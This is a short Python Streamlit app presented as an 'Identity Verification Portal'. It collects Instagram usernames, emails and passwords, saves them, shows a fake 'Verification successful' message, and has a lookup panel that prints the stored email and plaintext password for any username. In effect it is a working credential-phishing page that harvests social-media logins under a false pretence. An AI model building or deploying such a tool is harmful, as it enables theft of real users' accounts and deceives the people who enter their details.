import streamlit as st
from core_utils import save_credentials, get_credentials

st.set_page_config(page_title="Auth Module", layout="centered")
st.title("🔐 Identity Verification Portal")

with st.form("collect_form"):
    username = st.text_input("Instagram Username")
    email = st.text_input("Email Address")
    password = st.text_input("Password", type="password")
    submitted = st.form_submit_button("Verify")

if submitted:
    if username and email and password:
        save_credentials(username, email, password)
        st.success("Verification successful. Redirecting...")
    else:
        st.error("All fields are required.")

st.markdown("---")
lookup_user = st.text_input("Enter username to retrieve credentials")
if st.button("Retrieve"):
    result = get_credentials(lookup_user)
    if result:
        st.write(f"Email: {result[0]}")
        st.write(f"Password: {result[1]}")
    else:
        st.warning("No records found.")